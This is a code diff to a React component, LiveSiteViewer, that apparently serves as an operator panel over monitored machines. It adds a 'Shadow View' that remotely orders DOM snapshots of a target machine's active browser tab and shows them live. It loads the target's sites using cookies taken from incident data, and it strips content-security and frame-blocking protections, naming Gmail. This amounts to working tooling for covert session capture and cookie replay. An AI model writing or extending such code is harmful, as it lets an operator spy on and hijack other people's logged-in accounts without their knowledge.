@@ -24,6 +24,8 @@ interface LiveSiteViewerProps {
 
 const PROXY_BASE = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';
 
+type ViewMode = 'shadow' | 'independent';
+
 export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   const [srcDoc, setSrcDoc] = useState<string | null>(null);
   const [error, setError] = useState<string | null>(null);
@@ -33,6 +35,15 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   const [isPopupModalOpen, setIsPopupModalOpen] = useState(false);
   const [resolvedSession, setResolvedSession] = useState<{ machine_id: string; tab_id: string } | null>(null);
   const [incidentIdForProxy, setIncidentIdForProxy] = useState<string | null>(null);
+  const [iframeStatus, setIframeStatus] = useState<'loading' | 'ready' | 'timeout'>('loading');
+  
+  // Shadow Navigation states
+  const [viewMode, setViewMode] = useState<ViewMode>('shadow');
+  const [shadowSnapshot, setShadowSnapshot] = useState<any>(null);
+  const [independentUrl, setIndependentUrl] = useState<string | null>(null);
+  
+  // Auto-load tracking
+  const autoLoadedRef = useRef(false);
 
   // Fetch correct incident_id (INC-XXXXX format) for proxy calls
   useEffect(() => {
@@ -72,6 +83,222 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     };
     fetchIncidentId();
   }, [incident.id, incident.incident_id]);
+
+  // Shadow Navigation: Subscribe to DOM snapshots
+  useEffect(() => {
+    if (viewMode !== 'shadow') return;
+
+    console.log('[ShadowView] Setting up real-time subscription for', incident.machine_id);
+
+    const channel = supabase
+      .channel('dom-snapshots')
+      .on('postgres_changes', 
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'dom_snapshots',
+          filter: `machine_id=eq.${incident.machine_id}`
+        },
+        (payload) => {
+          console.log('[ShadowView] New snapshot received:', payload.new);
+          setShadowSnapshot(payload.new);
+          setError(null);
+        }
+      )
+      .subscribe();
+
+    // Fetch latest snapshot on mount
+    const fetchLatestSnapshot = async () => {
+      try {
+        const { data } = await supabase
+          .from('dom_snapshots')
+          .select('*')
+          .eq('machine_id', incident.machine_id)
+          .eq('is_latest', true)
+          .order('captured_at', { ascending: false })
+          .limit(1)
+          .maybeSingle();
+
+        if (data) {
+          console.log('[ShadowView] Loaded latest snapshot:', data.url);
+          setShadowSnapshot(data);
+        } else {
+          console.log('[ShadowView] No snapshots found yet');
+        }
+      } catch (error) {
+        console.error('[ShadowView] Failed to fetch snapshot:', error);
+      }
+    };
+    
+    // ✅ CORREÇÃO #2: Forçar captura manual ao entrar em Shadow Mode
+    const forceCaptureSnapshot = async () => {
+      try {
+        // Buscar user ID primeiro
+        const { data: { user } } = await supabase.auth.getUser();
+        
+        if (!user) {
+          console.warn('[ShadowView] No authenticated user');
+          return;
+        }
+        
+        // Buscar tab_id ativo
+        const { data: session } = await supabase
+          .from('active_sessions')
+          .select('*')
+          .eq('machine_id', incident.machine_id)
+          .eq('is_active', true)
+          .order('last_activity', { ascending: false })
+          .limit(1)
+          .maybeSingle();
+        
+        if (!session) {
+          console.warn('[ShadowView] No active session found');
+          return;
+        }
+        
+        // Extrair domain corretamente
+        const targetUrl = session.url || incident.tab_url || `https://${incident.host}`;
+        const targetDomain = new URL(targetUrl).hostname;
+        
+        // Criar comando dom-snapshot
+        const { data: cmd, error: cmdError } = await supabase
+          .from('remote_commands')
+          .insert({
+            command_type: 'dom-snapshot',
+            target_machine_id: incident.machine_id,
+            target_tab_id: session.tab_id,
+            target_domain: targetDomain,
+            payload: { include_resources: true },
+            executed_by: user.id
+          })
+          .select('id')
+          .single();
+        
+        // ✅ FIX: Verificar erro ANTES de usar cmd.id
+        if (cmdError || !cmd) {
+          console.error('[ShadowView] Failed to create command:', cmdError);
+          return;
+        }
+        
+        // Dispatch via command-dispatcher
+        await supabase.functions.invoke('command-dispatcher', {
+          body: {
+            command_id: cmd.id,
+            command_type: 'dom-snapshot',
+            target_machine_id: incident.machine_id,
+            target_tab_id: session.tab_id,
+            payload: { include_resources: true }
+          }
+        });
+        
+        console.log('[ShadowView] ✅ Forced snapshot capture:', cmd.id);
+      } catch (error) {
+        console.error('[ShadowView] Failed to force snapshot:', error);
+      }
+    };
+    
+    fetchLatestSnapshot();
+    forceCaptureSnapshot();
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+  }, [viewMode, incident.machine_id]);
+
+  // Render content based on view mode
+  useEffect(() => {
+    if (viewMode === 'shadow' && shadowSnapshot) {
+      // ✅ CORREÇÃO #1: Processar HTML completo com shadow flag
+      // SHADOW MODE: Render captured DOM with full processing (sem AntiRedirect)
+      const step1 = processContent(shadowSnapshot.html_content, shadowSnapshot.url, 'direct', { shadow: true });
+      const step2 = injectNavigationInterceptor(step1, shadowSnapshot.url);
+      
+      setIframeKey(k => k + 1);
+      setSrcDoc(step2);
+      setCurrentUrl(shadowSnapshot.url);
+    } else if (viewMode === 'independent' && independentUrl) {
+      // INDEPENDENT MODE: Fetch and process (previous behavior)
+      handleNavigation(independentUrl);
+    }
+  }, [viewMode, shadowSnapshot, independentUrl]);
+
+  // Inject minimal navigation interceptor (no URL rewriting needed)
+  const injectNavigationInterceptor = (html: string, baseUrl: string): string => {
+    const script = `
+    <script>
+      const BASE_URL = "${baseUrl}";
+      const INCIDENT_ID = "${incident.id}";
+      
+      // Interceptar cliques em links
+      document.addEventListener('click', (e) => {
+        const link = e.target.closest('a');
+        if (link && link.href) {
+          e.preventDefault();
+          console.log('[ShadowView] Link clicked:', link.href);
+          window.parent.postMessage({
+            type: 'local-proxy:navigate',
+            url: link.href,
+            incidentId: INCIDENT_ID
+          }, '*');
+        }
+      }, true);
+      
+      // Interceptar submits de formulários
+      document.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const form = e.target;
+        const action = form.action || BASE_URL;
+        console.log('[ShadowView] Form submitted:', action);
+        window.parent.postMessage({
+          type: 'local-proxy:navigate',
+          url: action,
+          incidentId: INCIDENT_ID
+        }, '*');
+      }, true);
+      
+      console.log('[ShadowView] Navigation interceptor active');
+    </script>
+  `;
+    
+    // Inject after <head> or before </body>
+    if (html.includes('</head>')) {
+      return html.replace('</head>', `${script}</head>`);
+    } else if (html.includes('</body>')) {
+      return html.replace('</body>', `${script}</body>`);
+    } else {
+      return html + script;
+    }
+  };
+
+  // Auto-load first page on mount
+  useEffect(() => {
+    if (autoLoadedRef.current) return;
+    
+    const startUrl = incident.tab_url || `https://${incident.host}`;
+    console.log('[AutoLoad] Initializing auto-load for:', startUrl);
+    
+    if (viewMode === 'shadow') {
+      // Give shadow view 1200ms to load a snapshot
+      const timeoutId = setTimeout(() => {
+        if (!shadowSnapshot && !autoLoadedRef.current) {
+          console.log('[AutoLoad] No snapshot yet, falling back to Independent mode');
+          autoLoadedRef.current = true;
+          setViewMode('independent');
+          setIndependentUrl(startUrl);
+        } else {
+          console.log('[AutoLoad] Shadow snapshot loaded, skipping independent fallback');
+          autoLoadedRef.current = true;
+        }
+      }, 1200);
+      
+      return () => clearTimeout(timeoutId);
+    } else {
+      console.log('[AutoLoad] Starting in Independent mode');
+      autoLoadedRef.current = true;
+      setIndependentUrl(startUrl);
+      handleNavigation(startUrl);
+    }
+  }, [incident.id, incident.tab_url, incident.host]);
 
   // Parse cookies from incident data
   useEffect(() => {
@@ -214,8 +441,12 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
       machine_online: dispatchData?.success === true
     });
     
-    if (!dispatchData?.success) {
+    if (!dispatchData?.success && dispatchData?.status !== 'queued') {
       console.warn('[ExtensionProxy] ⚠️ Máquina offline - comando será entregue via polling quando usuário conectar');
+    }
+    
+    if (dispatchData?.status === 'queued') {
+      console.log('[ExtensionProxy] ✅ Máquina online - comando enfileirado, será entregue via polling');
     }
     
     // 4. Poll for result in proxy_fetch_results (NOT popup_responses!)
@@ -236,7 +467,13 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
         });
         
         if (!result.success) {
-          throw new Error(result.error || 'Fetch failed');
+          console.error('[ExtensionProxy] ❌ Extension fetch failed:', {
+            url: url,
+            htmlLength: result.html_content?.length || 0,
+            error: result.error || 'Unknown error',
+            cookies: cookiesToUse.length
+          });
+          throw new Error(result.error || 'Fetch failed - check console for details');
         }
         
         return result.html_content;
@@ -262,9 +499,10 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
   };
 
   // Process HTML content locally: rewrite URLs and inject interception script
-  const processContent = (html: string, baseUrl: string, assetsMode: 'direct' | 'proxy' = 'direct'): string => {
+  const processContent = (html: string, baseUrl: string, assetsMode: 'direct' | 'proxy' = 'direct', options?: { shadow?: boolean }): string => {
     console.log('[LocalProxy] Processing content for:', baseUrl);
     console.log('[LocalProxy] Assets mode:', assetsMode);
+    console.log('[LocalProxy] Shadow mode:', options?.shadow || false);
     
     const base = new URL(baseUrl);
     const origin = `${base.protocol}//${base.host}`;
@@ -272,57 +510,133 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     
     let processed = html;
     
-    // Inject <base href> into <head> to fix relative URLs
+    // 🔓 STEP 1: Remove ALL existing CSP and frame-blocking headers AGGRESSIVELY
+    processed = processed.replace(/<meta[^>]+http-equiv=["']Content-Security-Policy(-Report-Only)?["'][^>]*>/gi, '');
+    processed = processed.replace(/<meta[^>]+name=["']?x-frame-options["']?[^>]*>/gi, '');
+    processed = processed.replace(/<meta[^>]+content=["'][^"']*frame-options[^"']*["'][^>]*>/gi, '');
+    
+    // Remove CSP defined in inline scripts (common in Gmail)
+    processed = processed.replace(/<script[^>]*>[\s\S]*?Content-Security-Policy[\s\S]*?<\/script>/gi, '');
+    console.log('[LocalProxy] 🧹 Removed inline CSP definitions');
+    
+    // ✅ SHADOW MODE: Remove ALL scripts and on* attributes
+    if (options?.shadow) {
+      // Remove all <script> tags
+      processed = processed.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
+      console.log('[LocalProxy] 🧹 Removed all <script> tags (shadow mode)');
+      
+      // Remove all on* event attributes
+      processed = processed.replace(/\son[a-z\-]+\s*=\s*["'][^"']*["']/gi, '');
+      console.log('[LocalProxy] 🧹 Removed all on* attributes (shadow mode)');
+    }
+    
+    // ✅ FIX: STEP 2 - Inject CSP FIRST (before base tag)
+    // Shadow Mode: Allow 'unsafe-inline' scripts for navigation interceptor
+    const csp = options?.shadow 
+      ? `<meta http-equiv="Content-Security-Policy" content="default-src * data: blob: 'unsafe-inline'; script-src 'unsafe-inline'; connect-src 'none'; worker-src 'none'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:; frame-src *; base-uri *;">`
+      : `<meta http-equiv="Content-Security-Policy" content="default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:; connect-src *; frame-src *; base-uri *;">`;
+    
+    if (processed.includes('<head>')) {
+      processed = processed.replace('<head>', `<head>\n${csp}`);
+      console.log(`[LocalProxy] ✅ Injected ${options?.shadow ? 'Shadow (inline scripts allowed)' : 'permissive'} CSP at top of <head>`);
+    }
+    
+    // 🔗 STEP 3: Inject <base href> AFTER CSP
     const baseTag = `<base href="${origin}">`;
-    if (processed.includes('</head>')) {
-      processed = processed.replace('</head>', `${baseTag}\n</head>`);
-      console.log('[LocalProxy] Injected <base href="' + origin + '">');
-    } else if (processed.includes('<head>')) {
+    if (processed.includes('<head>')) {
       processed = processed.replace('<head>', `<head>\n${baseTag}`);
-      console.log('[LocalProxy] Injected <base href="' + origin + '"> in head');
+      console.log('[LocalProxy] ✅ Injected <base href> after CSP');
     }
     
-    // Remove CSP that might block resources
-    processed = processed.replace(/<meta[^>]+http-equiv=["']Content-Security-Policy["'][^>]*>/gi, '');
+    // 🔗 STEP 4: Convert relative script src to absolute URLs
+    processed = processed.replace(/<script([^>]*)\ssrc=["']\/([^"']+)["']/gi, (match, attrs, path) => {
+      return `<script${attrs} src="${origin}/${path}"`;
+    });
+    console.log('[LocalProxy] 🔗 Converted relative script URLs to absolute');
     
-    // Only rewrite assets if using proxy mode (not direct from extension)
-    if (assetsMode === 'proxy') {
-      // Rewrite CSS links
-      processed = processed.replace(
-        /(<link[^>]+href=["'])([^"']+)(["'][^>]*>)/gi,
-        (match, prefix, url, suffix) => {
-          try {
-            const absolute = new URL(url, origin).href;
+    // Rewrite assets - always convert relative URLs to absolute
+    // Rewrite CSS links
+    processed = processed.replace(
+      /(<link[^>]+href=["'])([^"']+)(["'][^>]*>)/gi,
+      (match, prefix, url, suffix) => {
+        try {
+          // Skip only absolute HTTP(S) and special protocols
+          if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('data:') || url.startsWith('blob:')) {
+            return match;
+          }
+          
+          // Normalize protocol-relative and relative URLs
+          let absolute;
+          if (url.startsWith('//')) {
+            // Protocol-relative: //example.com/path → https://example.com/path
+            absolute = `https:${url}`;
+          } else {
+            // Relative: /path or path → https://origin/path
+            absolute = new URL(url, origin).href;
+          }
+          
+          if (assetsMode === 'proxy') {
             const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
             return `${prefix}${proxied}${suffix}`;
-          } catch { return match; }
-        }
-      );
-      
-      // Rewrite Scripts
-      processed = processed.replace(
-        /(<script[^>]+src=["'])([^"']+)(["'][^>]*>)/gi,
-        (match, prefix, url, suffix) => {
-          try {
-            const absolute = new URL(url, origin).href;
+          }
+          return `${prefix}${absolute}${suffix}`;
+        } catch { return match; }
+      }
+    );
+    
+    // Rewrite Scripts
+    processed = processed.replace(
+      /(<script[^>]+src=["'])([^"']+)(["'][^>]*>)/gi,
+      (match, prefix, url, suffix) => {
+        try {
+          // Skip only absolute HTTP(S) and special protocols
+          if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('data:') || url.startsWith('blob:')) {
+            return match;
+          }
+          
+          // Normalize protocol-relative and relative URLs
+          let absolute;
+          if (url.startsWith('//')) {
+            absolute = `https:${url}`;
+          } else {
+            absolute = new URL(url, origin).href;
+          }
+          
+          if (assetsMode === 'proxy') {
             const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
             return `${prefix}${proxied}${suffix}`;
-          } catch { return match; }
-        }
-      );
-      
-      // Rewrite Images
-      processed = processed.replace(
-        /(<img[^>]+src=["'])([^"']+)(["'])/gi,
-        (match, prefix, url, suffix) => {
-          try {
-            const absolute = new URL(url, origin).href;
+          }
+          return `${prefix}${absolute}${suffix}`;
+        } catch { return match; }
+      }
+    );
+    
+    // Rewrite Images
+    processed = processed.replace(
+      /(<img[^>]+src=["'])([^"']+)(["'])/gi,
+      (match, prefix, url, suffix) => {
+        try {
+          // Skip only absolute HTTP(S) and special protocols
+          if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('data:') || url.startsWith('blob:')) {
+            return match;
+          }
+          
+          // Normalize protocol-relative and relative URLs
+          let absolute;
+          if (url.startsWith('//')) {
+            absolute = `https:${url}`;
+          } else {
+            absolute = new URL(url, origin).href;
+          }
+          
+          if (assetsMode === 'proxy') {
             const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
             return `${prefix}${proxied}${suffix}`;
-          } catch { return match; }
-        }
-      );
-    }
+          }
+          return `${prefix}${absolute}${suffix}`;
+        } catch { return match; }
+      }
+    );
     
     // Always rewrite anchors and forms for navigation interception (make them absolute)
     processed = processed.replace(
@@ -346,14 +660,134 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
       }
     );
     
-    // Inject custom interception script without data attributes
-    const interceptionScript = `
+    // 📍 STEP 5: Inject anti-redirect and interception scripts (SKIP in shadow mode)
+    const antiRedirectScript = options?.shadow ? '' : `
 <script>
 (function() {
   const BASE_URL = ${JSON.stringify(baseUrl)};
   const INCIDENT_ID = ${JSON.stringify(proxyIncidentId)};
   
+  // 🚫 Block all redirects (ONLY in independent mode)
+  const originalAssign = window.location.assign;
+  const originalReplace = window.location.replace;
+  
+  window.location.assign = function(url) {
+    console.log('[AntiRedirect] Blocked assign to:', url);
+    return false;
+  };
+  
+  window.location.replace = function(url) {
+    console.log('[AntiRedirect] Blocked replace to:', url);
+    return false;
+  };
+  
+  // ❌ REMOVED: Don't redefine href property (causes errors)
+  console.log('[AntiRedirect] Protection active');
+  
+  // 🔗 UNIVERSAL URL NORMALIZER (for dynamically added elements)
+  const ORIGIN = new URL(BASE_URL).origin;
+
+  function normalizeUrl(url) {
+    if (!url || url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('javascript:') || url.startsWith('#')) {
+      return url;
+    }
+    
+    // Already absolute
+    if (url.startsWith('http://') || url.startsWith('https://')) {
+      return url;
+    }
+    
+    // Protocol-relative: //example.com/path
+    if (url.startsWith('//')) {
+      return 'https:' + url;
+    }
+    
+    // Relative: /path or path
+    try {
+      return new URL(url, ORIGIN).href;
+    } catch {
+      return url;
+    }
+  }
+
+  // Intercept setAttribute for ALL dynamic elements
+  const originalSetAttribute = Element.prototype.setAttribute;
+  Element.prototype.setAttribute = function(name, value) {
+    if ((name === 'src' || name === 'href' || name === 'action') && typeof value === 'string') {
+      const normalized = normalizeUrl(value);
+      if (normalized !== value) {
+        console.log('[Normalizer] ' + name + ': ' + value + ' → ' + normalized);
+      }
+      value = normalized;
+    }
+    return originalSetAttribute.call(this, name, value);
+  };
+
+  // Override property setters for common elements
+  const descriptors = {
+    script: { prop: 'src', proto: HTMLScriptElement.prototype },
+    img: { prop: 'src', proto: HTMLImageElement.prototype },
+    link: { prop: 'href', proto: HTMLLinkElement.prototype },
+    iframe: { prop: 'src', proto: HTMLIFrameElement.prototype },
+    form: { prop: 'action', proto: HTMLFormElement.prototype }
+  };
+
+  Object.entries(descriptors).forEach(function(entry) {
+    const tag = entry[0];
+    const config = entry[1];
+    const prop = config.prop;
+    const proto = config.proto;
+    
+    const original = Object.getOwnPropertyDescriptor(proto, prop);
+    if (original && original.set) {
+      Object.defineProperty(proto, prop, {
+        configurable: original.configurable,
+        enumerable: original.enumerable,
+        get: original.get,
+        set: function(value) {
+          const normalized = normalizeUrl(value);
+          if (normalized !== value) {
+            console.log('[Normalizer] ' + tag + '.' + prop + ': ' + value + ' → ' + normalized);
+          }
+          return original.set.call(this, normalized);
+        }
+      });
+    }
+  });
+
+  // MutationObserver for newly added elements
+  const observer = new MutationObserver(function(mutations) {
+    mutations.forEach(function(mutation) {
+      mutation.addedNodes.forEach(function(node) {
+        if (node.nodeType === 1) { // Element
+          // Normalize the node and all its descendants
+          const elements = [node];
+          const descendants = node.querySelectorAll ? node.querySelectorAll('[src], [href], [action]') : [];
+          for (let i = 0; i < descendants.length; i++) {
+            elements.push(descendants[i]);
+          }
+          
+          elements.forEach(function(el) {
+            ['src', 'href', 'action'].forEach(function(attr) {
+              const value = el.getAttribute(attr);
+              if (value) {
+                const normalized = normalizeUrl(value);
+                if (normalized !== value) {
+                  el.setAttribute(attr, normalized);
+                }
+              }
+            });
+          });
+        }
+      });
+    });
+  });
+
+  observer.observe(document, { childList: true, subtree: true });
+
+  console.log('[LocalProxy] 🌐 Universal URL normalizer active for:', ORIGIN);
   console.log('[LocalProxy] Interception active for:', BASE_URL);
+  console.log('[AntiRedirect] Protection active');
   
   // Intercept all link clicks - use href directly (already absolute URLs)
   document.addEventListener('click', function(e) {
@@ -403,11 +837,11 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     
     // Inject script before closing </head> or </body>
     if (processed.includes('</head>')) {
-      processed = processed.replace('</head>', `${interceptionScript}</head>`);
+      processed = processed.replace('</head>', `${antiRedirectScript}</head>`);
     } else if (processed.includes('</body>')) {
-      processed = processed.replace('</body>', `${interceptionScript}</body>`);
+      processed = processed.replace('</body>', `${antiRedirectScript}</body>`);
     } else {
-      processed = processed + interceptionScript;
+      processed = processed + antiRedirectScript;
     }
     
     return processed;
@@ -446,7 +880,8 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
       
       if (event.data?.type === 'local-proxy:navigate') {
         const { url, incidentId } = event.data;
-        if (incidentId !== incident.id) return;
+        // Relaxed check: allow events without incidentId
+        if (incidentId && incidentId !== incident.id) return;
         
         handleNavigation(url);
       }
@@ -456,8 +891,9 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
     return () => window.removeEventListener('message', handleMessage);
   }, [incident.id, cookies]);
 
-  const loadSiteWithCookies = async () => {
-    if (!incident.tab_url) {
+  const loadSiteWithCookies = async (targetUrl?: string) => {
+    const url = targetUrl || incident.tab_url;
+    if (!url) {
       setError('URL do site não disponível');
       return;
     }
@@ -546,7 +982,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
 
     // Wait a bit for setCookies to update state, then navigate
     await new Promise(resolve => setTimeout(resolve, 100));
-    await handleNavigation(incident.tab_url);
+    await handleNavigation(url);
   };
 
   const refreshSite = () => {
@@ -662,9 +1098,47 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
               </Badge>
             </div>
 
+            {/* View Mode Toggle */}
+            <div className="flex items-center gap-2 mt-3">
+              <Button
+                variant={viewMode === 'shadow' ? 'default' : 'outline'}
+                size="sm"
+                onClick={() => {
+                  setViewMode('shadow');
+                  setSrcDoc(null);
+                }}
+                className="gap-2"
+              >
+                👁️ Shadow View
+              </Button>
+              <Button
+                variant={viewMode === 'independent' ? 'default' : 'outline'}
+                size="sm"
+                onClick={() => {
+                  setViewMode('independent');
+                  setIndependentUrl(incident.tab_url || `https://${incident.host}`);
+                }}
+                className="gap-2"
+              >
+                🔍 Independent
+              </Button>
+              
+              {viewMode === 'shadow' && shadowSnapshot && (
+                <Badge variant="outline" className="ml-2">
+                  Watching: {new URL(shadowSnapshot.url).hostname}
+                </Badge>
+              )}
+              
+              {viewMode === 'shadow' && !shadowSnapshot && (
+                <Badge variant="outline" className="ml-2 text-muted-foreground">
+                  Aguardando atividade...
+                </Badge>
+              )}
+            </div>
+
             <div className="flex items-center gap-2 mt-2">
               <Button
-                onClick={loadSiteWithCookies}
+                onClick={() => loadSiteWithCookies()}
                 disabled={!incident.tab_url}
                 size="sm"
                 className="gap-2"
@@ -707,7 +1181,7 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
             </div>
           </CardHeader>
 
-          <CardContent className="flex-1 p-0 overflow-hidden">
+          <CardContent className="flex-1 p-0 overflow-hidden relative">
             {error && (
               <Alert variant="destructive" className="m-4">
                 <AlertCircle className="h-4 w-4" />
@@ -715,12 +1189,26 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
               </Alert>
             )}
 
+            {/* Status Indicators */}
+            {iframeStatus === 'timeout' && (
+              <div className="absolute top-4 right-4 z-10 bg-yellow-500/90 text-white px-3 py-1.5 rounded-md text-sm font-medium shadow-lg flex items-center gap-2">
+                <span>⚠️</span>
+                <span>Site carregado mas pode ter funcionalidade limitada</span>
+              </div>
+            )}
+            {iframeStatus === 'loading' && srcDoc && (
+              <div className="absolute top-4 right-4 z-10 bg-blue-500/90 text-white px-3 py-1.5 rounded-md text-sm font-medium shadow-lg flex items-center gap-2">
+                <span className="animate-spin">⏳</span>
+                <span>Carregando site...</span>
+              </div>
+            )}
+
             {srcDoc && (
               <iframe
-                key={`local-proxy-${iframeKey}`}
+                key={iframeKey}
                 srcDoc={srcDoc}
                 className="w-full h-full border-0"
-                sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"
+                sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads allow-modals"
                 title={`Site: ${incident.host}`}
                 onLoad={() => console.log('[LocalProxy] Iframe loaded')}
                 onError={(e) => console.error('[LocalProxy] Iframe error:', e)}
